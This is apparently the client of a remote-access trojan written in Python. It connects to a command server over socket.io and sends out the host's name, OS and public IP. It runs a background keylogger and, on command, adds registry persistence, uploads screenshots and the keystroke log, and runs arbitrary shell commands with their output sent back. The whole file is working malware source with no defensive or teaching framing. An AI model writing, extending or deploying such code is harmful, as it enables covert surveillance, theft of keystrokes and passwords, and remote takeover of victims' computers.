import socketio
import subprocess
import platform
import socket
import os
from modules import persistence, keylogger
from requests import get
import pyscreenshot as ImageGrab
import threading

info = {}
sio = socketio.Client()
communication = {}
persistenceVariable = False

info['COMMAND'] = 'INFO'
info["hostname"] = socket.gethostname()
info["OS"] = platform.platform()
info["IP"] = ip = get('https://api.ipify.org').text

x = threading.Thread(target=keylogger.startKeylogger)
x.start()

@sio.event
def connect():
    info['sid'] = sio.sid
    sio.send(info)
    print('connection established')


@sio.event
def message(data):
    idNum = data['idNum']
    data = data['newTask']

    global communication
    communication['COMMAND'] = 'OUTPUT'
    communication['hostname'] = info['hostname']
    communication['commandSent'] = data
    communication['idNum'] = idNum

    try:
        global persistenceVariable

        if len(data) > 0:

#Do persistance stuff
            if 'persistence' in data:
                if not persistenceVariable:
                    if persistence.tryPersistence():
                        persistenceVariable = True
                        communication['PV'] = persistenceVariable
                        communication['DATA'] = 'Tried to add registry keys for persistence: Success'
                        sio.send(communication)

                else:
                    communication['PV'] = persistenceVariable
                    communication['DATA'] = 'Tried to add registry keys for persistence, result is: Failure'
                    sio.send(communication)

#Get Screenshot

            if 'screenshot' in data:
                try:
                    im = ImageGrab.grab()
                    im.save('screenshot.png')
                    with open('screenshot.png', 'rb') as f:
                        communication['DATA'] = f.read()
                        sio.send(communication)
                        f.close()
                except Exception as e:
                    print('Error taking screenshot' + str(e))
                    communication['DATA'] = 'Error taking screenshot'
                    sio.send(communication)

#Get Keylogger File
            if 'keylogger' in data:
                try:
                    with open('ear.txt', 'rb') as f:
                        communication['DATA'] = f.read()
                        sio.send(communication)
                        f.close()
                except Exception as e:
                    print(str(e))
                    communication['DATA'] = 'Error getting keylog file.'
                    sio.send(communication)


#Simple CMD Commands
            if  'cmd' in data:
                data = data.replace('cmd ', '')
                cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                       stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte, "utf-8")
                currentWD = os.getcwd() + "> "
                tmpString = output_str + currentWD
                communication['DATA'] = tmpString
                sio.send(communication)

    except Exception as e:
        print("Error: " + str(e))


@sio.event
def disconnect():
    print('disconnected from server')


# Do From here
sio.connect('http://localhost:5000')
sio.wait()
